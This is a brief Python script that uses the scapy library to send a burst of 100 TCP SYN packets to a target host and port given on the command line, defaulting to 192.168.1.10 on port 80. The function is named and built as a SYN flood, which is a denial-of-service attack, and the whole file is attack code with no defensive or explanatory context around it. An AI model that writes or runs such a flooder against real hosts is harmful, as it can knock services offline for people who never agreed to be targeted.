from scapy.all import IP, TCP, send
import sys
import random

def tcp_syn_flood(target_ip, target_port):
    packet = IP(dst=target_ip)/TCP(dport=int(target_port), flags="S")
    send(packet, count=100, verbose=True)
    return f"Sent 100 TCP SYN packets to {target_ip}:{target_port}"

if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else '192.168.1.10'
    port = sys.argv[2] if len(sys.argv) > 2 else '80'
    print(tcp_syn_flood(target, port))
